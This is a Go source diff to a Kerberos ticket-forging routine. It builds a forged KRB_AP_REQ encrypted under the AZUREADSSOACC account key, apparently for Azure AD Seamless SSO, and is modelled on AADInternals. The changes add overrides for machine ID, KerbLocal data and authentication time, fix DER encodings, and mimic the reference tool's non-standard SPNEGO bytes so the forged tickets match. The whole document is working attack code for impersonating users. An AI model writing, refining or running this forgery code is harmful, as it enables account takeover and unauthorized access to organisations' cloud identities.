@@ -15,6 +15,9 @@ type ForgeParams struct {
 	Realm         string
 	PAC           []byte
 	UserName      string
+	MachineID     []byte
+	KerbLocal2    []byte
+	AuthTimeFT    uint64 // FileTime for authTime override (0 = use now-43s)
 }
 
 // ForgedTicket holds the SPNEGO-wrapped KRB_AP_REQ.
@@ -25,15 +28,27 @@ type ForgedTicket struct {
 // Forge builds a complete forged KRB_AP_REQ with SPNEGO wrapping.
 // Uses manual DER construction matching AADInternals Kerberos.ps1.
 func Forge(params *ForgeParams) (*ForgedTicket, error) {
-	now := time.Now().UTC()
-	authTime := now.Add(-43 * time.Second)
-	endTime := now.Add(10 * time.Hour)
-	renewTime := now.Add(7 * 24 * time.Hour)
+	now := time.Now().UTC().Truncate(time.Second)
+	var authTimeFiletime uint64
+	if params.AuthTimeFT != 0 {
+		authTimeFiletime = params.AuthTimeFT
+	} else {
+		authTime := now.Add(-43 * time.Second)
+		authTimeFiletime = uint64(authTime.UnixNano())/100 + 116444736000000000
+	}
+	// Convert FileTime back to time.Time for derTime()
+	authTime := time.Unix(0, int64((authTimeFiletime-116444736000000000)*100)).UTC()
+	endTime := authTime.Add(10 * time.Hour)
+	renewTime := authTime.Add(7 * 24 * time.Hour)
 	ctime := now
 
 	sessionKey := randomBytes(16)
-	machineID := randomBytes(32)
-	kerbLocal2 := randomBytes(16)
+	if params.MachineID == nil {
+		params.MachineID = randomBytes(32)
+	}
+	if params.KerbLocal2 == nil {
+		params.KerbLocal2 = randomBytes(16)
+	}
 	seqNumber := randomBytes(4)
 
 	// Encrypt ticket body (EncTicketPart) with AZUREADSSOACC key
@@ -41,7 +56,7 @@ func Forge(params *ForgeParams) (*ForgedTicket, error) {
 	encTicket := encryptRC4(params.Key, ticketBody, ticketUsage)
 
 	// Build authenticator and encrypt with session key
-	authBody := buildAuthenticatorDER(ctime, sessionKey, seqNumber, machineID, kerbLocal2, params)
+	authBody := buildAuthenticatorDER(ctime, sessionKey, seqNumber, params.MachineID, params.KerbLocal2, params)
 	encAuth := encryptRC4(sessionKey, authBody, authUsage)
 
 	// Build KRB_AP_REQ
@@ -119,25 +134,24 @@ func buildTicketAuthDataDER(p *ForgeParams) []byte {
 					derTag(0xA1, derOctet(derSeq(  // SEQUENCE OF LSAP_TOKEN_INFO_INTEGRITY
 						derSeq(                      // single restriction
 							derTag(0xA0, derInt1(0)),
-							derTag(0xA1, derOctet(tokenRestrictionData())),
+							derTag(0xA1, derOctet(tokenRestrictionData(p.MachineID))),
 						),
 					))),
 				),
 				// KerbLocal
 				derSeq(
 					derTag(0xA0, derInt2(0x00, 0x8E)),
-					derTag(0xA1, derOctet(randomBytes(16))),
+					derTag(0xA1, derOctet(p.KerbLocal2)),
 				),
 			))),
 		),
 	)
 }
 
-func tokenRestrictionData() []byte {
+func tokenRestrictionData(machineID []byte) []byte {
 	b := make([]byte, 40)
-	b[0] = 0; b[1] = 0; b[2] = 0; b[3] = 0   // Flags: Full token
-	b[4] = 0x00; b[5] = 0x10; b[6] = 0; b[7] = 0 // IntegrityLevel: Low (0x1000)
-	// MachineId (32 bytes) at offset 8-39 — zeroed
+	b[4] = 0x00; b[5] = 0x10 // IntegrityLevel = Low (0x1000)
+	copy(b[8:], machineID)   // MachineId (32 bytes) at offset 8-39
 	return b
 }
 
@@ -172,8 +186,8 @@ func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbL
 				derTag(0xA0, derInt1(23)), // RC4
 				derTag(0xA1, derOctet(randomBytes(16))),
 			)),
-			// [7] seq-number
-			derTag(0xA7, derOctet(seqNumber)),
+		// [7] seq-number
+		derTag(0xA7, derIntBytes(seqNumber)),
 			// [8] authorization-data
 			derTag(0xA8, buildAuthAuthDataDER(machineID, kerbLocal2, p)),
 		),
@@ -181,13 +195,9 @@ func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbL
 }
 
 func gssChecksumData() []byte {
-	// Length prefix: 0x10 0x00 0x00 0x00 (16 in little-endian)
-	b := make([]byte, 28)
+	b := make([]byte, 24)
 	b[0] = 0x10; b[1] = 0x00; b[2] = 0x00; b[3] = 0x00
-	// Binding: 16 zero bytes (offset 4-19)
-	// Flags: 0x3E 0x20 0x00 0x00 (offset 20-23)
 	b[20] = 0x3E; b[21] = 0x20; b[22] = 0x00; b[23] = 0x00
-	// Filler: 4 zero bytes (offset 24-27)
 	return b
 }
 
@@ -198,12 +208,12 @@ func buildAuthAuthDataDER(machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
 		derSeq(
 			derTag(0xA0, derInt2(0x00, 0x01)), // AD-IF-RELEVANT
 			derTag(0xA1, derOctet(derSeq(
-				// ETYPE_NEGOTIATION
+				// ETYPE_NEGOTIATION (129)
 				derSeq(
 					derTag(0xA0, derInt2(0x00, 0x81)),
 					derTag(0xA1, derOctet(derSeq(derInt1(23)))),
 				),
-				// Token Restrictions
+				// Token Restrictions (141)
 				derSeq(
 					derTag(0xA0, derInt2(0x00, 0x8D)),
 					derTag(0xA1, derOctet(derSeq(
@@ -213,17 +223,17 @@ func buildAuthAuthDataDER(machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
 						),
 					))),
 				),
-				// KerbLocal
+				// KerbLocal (142)
 				derSeq(
 					derTag(0xA0, derInt2(0x00, 0x8E)),
 					derTag(0xA1, derOctet(kerbLocal2)),
 				),
-				// KerbApOptions
+				// KerbApOptions (143)
 				derSeq(
 					derTag(0xA0, derInt2(0x00, 0x8F)),
 					derTag(0xA1, derOctet([]byte{0x00, 0x40, 0x00, 0x00})),
 				),
-				// KerbServiceTarget
+				// KerbServiceTarget (144)
 				derSeq(
 					derTag(0xA0, derInt2(0x00, 0x90)),
 					derTag(0xA1, derUnicodeStr(svcName)),
@@ -292,7 +302,7 @@ func buildSPNEGO(apreq []byte) []byte {
 	mechToken := der(
 		0x60,
 		oidKerberosV5Der,                // OID
-		[]byte{0x01, 0x01, 0x00},        // BOOLEAN FALSE
+		[]byte{0x01, 0x00},              // BOOLEAN FALSE (AADInternals non-standard: no length byte)
 		apreq,                            // KRB_AP_REQ
 	)
 
@@ -368,6 +378,13 @@ func derInt3(v1, v2, v3 byte) []byte {
 	return []byte{0x02, 0x03, v1, v2, v3}
 }
 
+func derIntBytes(data []byte) []byte {
+	result := []byte{0x02}
+	result = append(result, derLen(len(data))...)
+	result = append(result, data...)
+	return result
+}
+
 func derOctet(data []byte) []byte {
 	result := []byte{0x04}
 	result = append(result, derLen(len(data))...)
@@ -393,7 +410,7 @@ func derGenStr(s string) []byte {
 }
 
 func derTime(t time.Time) []byte {
-	s := t.Format("20060102150405") + "Z"
+	s := t.UTC().Format("20060102150405") + "Z"
 	b := []byte(s)
 	result := []byte{0x18}
 	result = append(result, derLen(len(b))...)
